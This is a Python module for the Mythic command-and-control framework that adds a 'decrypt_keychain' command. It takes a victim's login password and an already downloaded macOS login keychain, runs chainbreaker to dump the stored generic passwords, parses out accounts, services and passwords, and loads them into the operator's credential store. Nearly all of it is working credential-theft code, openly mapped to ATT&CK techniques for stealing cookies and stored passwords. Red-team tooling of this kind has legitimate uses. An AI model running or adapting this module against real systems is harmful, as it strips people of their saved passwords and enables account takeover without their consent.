from mythic_container.MythicCommandBase import *
import os
from mythic_container.MythicRPC import *
import sys
import base64
import asyncio
import tempfile


class DecryptKeychainArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                display_name="User Login Password",
                name="password",
                type=ParameterType.String,
                description="p@55w0rd_here for user login",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=1
                    )
                ]
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name="file_id",
                type=ParameterType.String,
                description="File id of the user's already download login keychain",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=3
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class DecryptKeychainCommand(CommandBase):
    cmd = "decrypt_keychain"
    needs_admin = False
    help_cmd = "decrypt_keychain -password \"user account password\" -username {username}"
    description = "Decrypts the keychain and stores credentials in Mythic's credential store."
    version = 1
    supported_ui_features = [""]
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    argument_class = DecryptKeychainArguments
    script_only = True

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        password = taskData.args.get_arg("password")
        getkeychainDBResp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=taskData.args.get_arg("file_id"),
        ))

        if not getkeychainDBResp.Success:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"Failed to download file: {getkeychainDBResp.Error}".encode()
            ))
            response.Success = False
            response.Error = "Failed to get file"
            return response

        ## Write the downloaded login.keychain-db file to a new file on disk
        try:
            f = open("tmp_login.keychain-db", "wb")
            f.write(getkeychainDBResp.Content)
            f.close()
        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"Encountered an error attempting to write the keychainDB to a file: {e} ".encode()
            ))
            response.Success = False
            response.Error = "Failed to write file to disk"
            return response
        ## Decrypt Keychain and export keys to files
        try:
            proc = await asyncio.create_subprocess_shell(
                f"python3 -m chainbreaker --password=\"{password}\" --dump-generic-passwords {os.path.abspath(self.agent_code_path / '..' / '..' /'tmp_login.keychain-db')}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=str(self.agent_code_path / ".." )
            )
            stdout, stderr = await proc.communicate()
            stdout = stdout.decode()
            stderr = stderr.decode()
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"Keychain Decrypted:\n{stdout}\n\nErrors from Decrypting:\n{stderr}".encode()
            ))
            if len(stderr) > 0:
                response.Success = False
                response.TaskStatus = "error: Chainbreaker error"
                return response
        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=f"Chainbreaker script failed with error: {e}\n".encode()
            ))
            response.Success = False
            response.TaskStatus = "error: Chainbreaker error"
            return response
        ## Remove the login.keychain-db file from disk
        remove_temp_files()

        ## parse the Chrome Safe Storage key from the coresponding keychain password dump file
        ccs_passwords = []
        ccs_item = {
            "account": "",
            "comment": "",
            "credential": "",
            "realm": ""
        }
        for line in stdout.split("\n"):
            if "[+] Generic Password Record" in line:
                sys.stdout.flush()
                if ccs_item["credential"] != "":
                    ccs_passwords.append({
                        "account": ccs_item["account"],
                        "comment": ccs_item["comment"],
                        "credential": ccs_item["credential"],
                        "realm": ccs_item["realm"]
                    })
                ccs_item = {
                    "account": "",
                    "comment": "",
                    "credential": "",
                    "realm": ""
                }
            elif "[-] Print Name:" in line:
                ccs_item["comment"] = ccs_item["comment"] + line.split(":")[-1].strip()
                if ccs_item["comment"].startswith("b'"):
                    ccs_item["comment"] = ccs_item["comment"][2:-1]
                ccs_item["comment"] = f"\n{taskData.args.get_arg('username')}\n" + ccs_item["comment"]
            elif "[-] Account:" in line:
                ccs_item["account"] = line.split(":")[-1].strip()
                if ccs_item["account"].startswith("b'"):
                    ccs_item["account"] = ccs_item["account"][2:-1]
            elif "[-] Service:" in line:
                ccs_item["realm"] = line.split(":")[-1].strip()
                if ccs_item["realm"].startswith("b'"):
                    ccs_item["realm"] = ccs_item["realm"][2:-1]
            elif "Password:" in line:
                ccs_item["credential"] = line.split(":")[-1].strip()
                if ccs_item["credential"].startswith("b'"):
                    ccs_item["credential"] = ccs_item["credential"][2:-1]
        if ccs_item["credential"] != "":
            ccs_passwords.append(ccs_item)
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=taskData.Task.ID,
            Response="\n-----------------\n".encode()
        ))
        for cred in ccs_passwords:
            create_cred_resp = await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
                TaskID=taskData.Task.ID,
                Credentials=[MythicRPCCredentialData(**cred)]
            ))
            if create_cred_resp.Success:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=f"[*] Added credential: {cred}\n".encode()
                ))
            else:
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=f"[-] Failed to add credential: {cred}\n".encode()
                ))
        return response


def remove_temp_files():
    try:
        if os.path.isfile('tmp_Cookies'):
            os.remove('tmp_Cookies')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/tmp_Cookies file")
    try:
        if os.path.isfile('cookies.json'):
            os.remove('cookies.json')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/cookies.json file")
    try:
        if os.path.isfile('tmp_login.keychain-db'):
            os.remove('tmp_login.keychain-db')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/tmp_login.keychain-db")
